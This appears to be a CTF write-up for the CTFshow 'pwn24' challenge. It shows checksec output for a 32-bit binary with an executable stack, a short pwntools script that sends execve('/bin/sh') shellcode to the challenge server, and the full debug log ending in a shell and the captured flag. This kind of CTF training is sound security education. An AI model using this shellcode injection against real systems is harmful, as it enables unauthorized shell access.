```
tasike@tasike-VM:~/Desktop$ file pwn24
pwn24: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=20cd00cc558cea4c931ac0773ca1e8cd6abca0b3, not stripped
tasike@tasike-VM:~/Desktop$ checksec pwn24
[*] '/home/tasike/Desktop/pwn24'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

32位，部分开启RELRO，特别的有可读可写可执行的段(Has RWX segments)

----------------

RWX这种很明显就是要写shellcode

```python
from pwn import *
context(os = 'linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28231)
shellcode = asm(shellcraft.sh())
r.sendline(shellcode)
r.interactive()
```

---------

运行attack.py：
```
tasike@tasike-VM:~/Desktop$ python3 attack.py
[+] Opening connection to pwn.challenge.ctf.show on port 28231: Done
[DEBUG] cpp -C -nostdinc -undef -P -I/home/tasike/.local/lib/python3.10/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        push 0x732f2f2f
        push 0x6e69622f
        mov ebx, esp
        /* push argument array ['sh\x00'] */
        /* push 'sh\x00\x00' */
        push 0x1010101
        xor dword ptr [esp], 0x1016972
        xor ecx, ecx
        push ecx /* null terminate */
        push 4
        pop ecx
        add ecx, esp
        push ecx /* 'sh\x00' */
        mov ecx, esp
        xor edx, edx
        /* call execve() */
        push 11 /* 0xb */
        pop eax
        int 0x80
[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-nk8v4de7/step2 /tmp/pwn-asm-nk8v4de7/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-nk8v4de7/step3 /tmp/pwn-asm-nk8v4de7/step4
[DEBUG] Sent 0x2d bytes:
    00000000  6a 68 68 2f  2f 2f 73 68  2f 62 69 6e  89 e3 68 01  │jhh/│//sh│/bin│··h·│
    00000010  01 01 01 81  34 24 72 69  01 01 31 c9  51 6a 04 59  │····│4$ri│··1·│Qj·Y│
    00000020  01 e1 51 89  e1 31 d2 6a  0b 58 cd 80  0a           │··Q·│·1·j│·X··│·│
    0000002d
[*] Switching to interactive mode
[DEBUG] Received 0x53d bytes:
    00000000  20 20 20 20  e2 96 84 e2  96 84 e2 96  84 e2 96 84  │    │····│····│····│
    00000010  20 20 20 e2  96 84 e2 96  84 e2 96 84  e2 96 84 e2  │   ·│····│····│····│
    00000020  96 84 e2 96  84 e2 96 84  e2 96 84 20  20 e2 96 84  │····│····│··· │ ···│
    00000030  e2 96 84 e2  96 84 e2 96  84 e2 96 84  e2 96 84 e2  │····│····│····│····│
    00000040  96 84 e2 96  84 20 20 20  20 20 20 20  20 20 20 20  │····│·   │    │    │
    00000050  20 e2 96 84  e2 96 84 20  20 20 20 20  20 20 20 20  │ ···│··· │    │    │
    00000060  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000070  20 20 0a 20  20 e2 96 88  e2 96 88 e2  96 80 e2 96  │  · │ ···│····│····│
    00000080  80 e2 96 80  e2 96 80 e2  96 88 20 20  e2 96 80 e2  │····│····│··  │····│
    00000090  96 80 e2 96  80 e2 96 88  e2 96 88 e2  96 80 e2 96  │····│····│····│····│
    000000a0  80 e2 96 80  20 20 e2 96  88 e2 96 88  e2 96 80 e2  │····│  ··│····│····│
    000000b0  96 80 e2 96  80 e2 96 80  e2 96 80 e2  96 80 20 20  │····│····│····│··  │
    000000c0  20 20 20 20  20 20 20 20  20 20 e2 96  88 e2 96 88  │    │    │  ··│····│
    000000d0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000000e0  20 20 20 20  20 20 20 20  20 20 20 0a  20 e2 96 88  │    │    │   ·│ ···│
    000000f0  e2 96 88 e2  96 80 20 20  20 20 20 20  20 20 20 20  │····│··  │    │    │
    00000100  e2 96 88 e2  96 88 20 20  20 20 20 e2  96 88 e2 96  │····│··  │   ·│····│
    00000110  88 20 20 20  20 20 20 20  20 e2 96 84  e2 96 84 e2  │·   │    │ ···│····│
    00000120  96 88 e2 96  88 e2 96 88  e2 96 88 e2  96 88 e2 96  │····│····│····│····│
    00000130  84 20 20 e2  96 88 e2 96  88 e2 96 84  e2 96 88 e2  │·  ·│····│····│····│
    00000140  96 88 e2 96  88 e2 96 88  e2 96 84 20  20 20 e2 96  │····│····│··· │  ··│
    00000150  84 e2 96 88  e2 96 88 e2  96 88 e2 96  88 e2 96 84  │····│····│····│····│
    00000160  20 20 e2 96  88 e2 96 88  20 20 20 20  20 20 e2 96  │  ··│····│    │  ··│
    00000170  88 e2 96 88  0a 20 e2 96  88 e2 96 88  20 20 20 20  │····│· ··│····│    │
    00000180  20 20 20 20  20 20 20 e2  96 88 e2 96  88 20 20 20  │    │   ·│····│·   │
    00000190  20 20 e2 96  88 e2 96 88  e2 96 88 e2  96 88 e2 96  │  ··│····│····│····│
    000001a0  88 e2 96 88  e2 96 88 20  20 20 e2 96  88 e2 96 88  │····│··· │  ··│····│
    000001b0  e2 96 84 e2  96 84 e2 96  84 e2 96 84  20 e2 96 80  │····│····│····│ ···│
    000001c0  20 20 e2 96  88 e2 96 88  e2 96 80 20  20 20 e2 96  │  ··│····│··· │  ··│
    000001d0  88 e2 96 88  20 20 e2 96  88 e2 96 88  e2 96 80 20  │····│  ··│····│··· │
    000001e0  20 e2 96 80  e2 96 88 e2  96 88 20 e2  96 80 e2 96  │ ···│····│·· ·│····│
    000001f0  88 20 20 e2  96 88 e2 96  88 20 20 e2  96 88 e2 96  │·  ·│····│·  ·│····│
    00000200  80 0a 20 e2  96 88 e2 96  88 e2 96 84  20 20 20 20  │·· ·│····│····│    │
    00000210  20 20 20 20  20 20 e2 96  88 e2 96 88  20 20 20 20  │    │  ··│····│    │
    00000220  20 e2 96 88  e2 96 88 20  20 20 20 20  20 20 20 20  │ ···│··· │    │    │
    00000230  e2 96 80 e2  96 80 e2 96  80 e2 96 80  e2 96 88 e2  │····│····│····│····│
    00000240  96 88 e2 96  84 20 20 e2  96 88 e2 96  88 20 20 20  │····│·  ·│····│·   │
    00000250  20 e2 96 88  e2 96 88 20  20 e2 96 88  e2 96 88 20  │ ···│··· │ ···│··· │
    00000260  20 20 20 e2  96 88 e2 96  88 20 20 e2  96 88 e2 96  │   ·│····│·  ·│····│
    00000270  88 e2 96 84  e2 96 88 e2  96 88 e2 96  84 e2 96 88  │····│····│····│····│
    00000280  e2 96 88 20  0a 20 20 e2  96 88 e2 96  88 e2 96 84  │··· │·  ·│····│····│
    00000290  e2 96 84 e2  96 84 e2 96  84 e2 96 88  20 20 20 20  │····│····│····│    │
    000002a0  20 e2 96 88  e2 96 88 20  20 20 20 20  e2 96 88 e2  │ ···│··· │    │····│
    000002b0  96 88 20 20  20 20 20 20  20 20 e2 96  88 e2 96 84  │··  │    │  ··│····│
    000002c0  e2 96 84 e2  96 84 e2 96  84 e2 96 84  e2 96 88 e2  │····│····│····│····│
    000002d0  96 88 20 20  e2 96 88 e2  96 88 20 20  20 20 e2 96  │··  │····│··  │  ··│
    000002e0  88 e2 96 88  20 20 e2 96  80 e2 96 88  e2 96 88 e2  │····│  ··│····│····│
    000002f0  96 84 e2 96  84 e2 96 88  e2 96 88 e2  96 80 20 20  │····│····│····│··  │
    00000300  e2 96 80 e2  96 88 e2 96  88 20 20 e2  96 88 e2 96  │····│····│·  ·│····│
    00000310  88 e2 96 80  20 0a 20 20  20 20 e2 96  80 e2 96 80  │····│ ·  │  ··│····│
    00000320  e2 96 80 e2  96 80 20 20  20 20 20 20  e2 96 80 e2  │····│··  │    │····│
    00000330  96 80 20 20  20 20 20 e2  96 80 e2 96  80 20 20 20  │··  │   ·│····│·   │
    00000340  20 20 20 20  20 20 e2 96  80 e2 96 80  e2 96 80 e2  │    │  ··│····│····│
    00000350  96 80 e2 96  80 e2 96 80  20 20 20 e2  96 80 e2 96  │····│····│   ·│····│
    00000360  80 20 20 20  20 e2 96 80  e2 96 80 20  20 20 20 e2  │·   │ ···│··· │   ·│
    00000370  96 80 e2 96  80 e2 96 80  e2 96 80 20  20 20 20 20  │····│····│··· │    │
    00000380  e2 96 80 e2  96 80 20 20  e2 96 80 e2  96 80 20 20  │····│··  │····│··  │
    00000390  0a 20 20 20  20 2a 20 2a  2a 2a 2a 2a  2a 2a 2a 2a  │·   │ * *│****│****│
    000003a0  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  │****│****│****│****│
    000003b0  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  20 20 20 20  │****│****│****│    │
    000003c0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000003d0  20 20 20 20  20 20 20 0a  20 20 20 20  2a 20 43 6c  │    │   ·│    │* Cl│
    000003e0  61 73 73 69  66 79 3a 20  43 54 46 73  68 6f 77 20  │assi│fy: │CTFs│how │
    000003f0  2d 2d 2d 20  50 57 4e 20  2d 2d 2d 20  e5 85 a5 e9  │--- │PWN │--- │····│
    00000400  97 a8 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │··  │    │    │    │
    00000410  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000420  0a 20 20 20  20 2a 20 54  79 70 65 20  20 3a 20 4c  │·   │ * T│ype │ : L│
    00000430  69 6e 75 78  5f 53 65 63  75 72 69 74  79 5f 4d 65  │inux│_Sec│urit│y_Me│
    00000440  63 68 61 6e  69 73 6d 73  20 20 20 20  20 20 20 20  │chan│isms│    │    │
    00000450  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000460  20 20 20 20  20 20 20 0a  20 20 20 20  2a 20 53 69  │    │   ·│    │* Si│
    00000470  74 65 20 20  3a 20 68 74  74 70 73 3a  2f 2f 63 74  │te  │: ht│tps:│//ct│
    00000480  66 2e 73 68  6f 77 2f 20  20 20 20 20  20 20 20 20  │f.sh│ow/ │    │    │
    00000490  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000004a0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 0a 20  │    │    │    │  · │
    000004b0  20 20 20 2a  20 48 69 6e  74 20 20 3a  20 4e 58 20  │   *│ Hin│t  :│ NX │
    000004c0  64 69 73 61  62 6c 65 64  20 26 20 48  61 73 20 52  │disa│bled│ & H│as R│
    000004d0  57 58 20 73  65 67 6d 65  6e 74 73 20  20 20 20 20  │WX s│egme│nts │    │
    000004e0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000004f0  20 20 20 20  20 0a 20 20  20 20 2a 20  2a 2a 2a 2a  │    │ ·  │  * │****│
    00000500  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  │****│****│****│****│
    *
    00000520  2a 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │*   │    │    │    │
    00000530  20 20 20 20  20 20 20 20  20 20 20 20  0a           │    │    │    │·│
    0000053d
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Linux_Security_Mechanisms                               
    * Site  : https://ctf.show/                                       
    * Hint  : NX disabled & Has RWX segments                          
    * *************************************                           
[DEBUG] Received 0x32 bytes:
    00000000  6a 68 68 2f  2f 2f 73 68  2f 62 69 6e  89 e3 68 01  │jhh/│//sh│/bin│··h·│
    00000010  01 01 01 81  34 24 72 69  01 01 31 c9  51 6a 04 59  │····│4$ri│··1·│Qj·Y│
    00000020  01 e1 51 89  e1 31 d2 6a  0b 58 cd 80  0a 88 f1 f7  │··Q·│·1·j│·X··│····│
    00000030  46 0a                                               │F·│
    00000032
jhh///sh/bin\x89\xe3h\x814$ri1\xc9Qj\x04Y\xe1Q\x89\xe11\xd2j\x0bX̀
\x88\xf1\xf7F
$      ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x75 bytes:
    b'bin\n'
    b'boot\n'
    b'ctfshow_flag\n'
    b'dev\n'
    b'etc\n'
    b'home\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'media\n'
    b'mnt\n'
    b'opt\n'
    b'proc\n'
    b'pwn\n'
    b'root\n'
    b'run\n'
    b'sbin\n'
    b'srv\n'
    b'start.sh\n'
    b'sys\n'
    b'tmp\n'
    b'usr\n'
    b'var\n'
bin
boot
ctfshow_flag
dev
etc
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
start.sh
sys
tmp
usr
var
$ cat ctfshow_flag
[DEBUG] Sent 0x11 bytes:
    b'cat ctfshow_flag\n'
[DEBUG] Received 0x2e bytes:
    b'ctfshow{addcd97a-8f38-4786-8dfa-01fe33e126f4}\n'
ctfshow{addcd97a-8f38-4786-8dfa-01fe33e126f4}
[*] Got EOF while reading in interactive
$
```

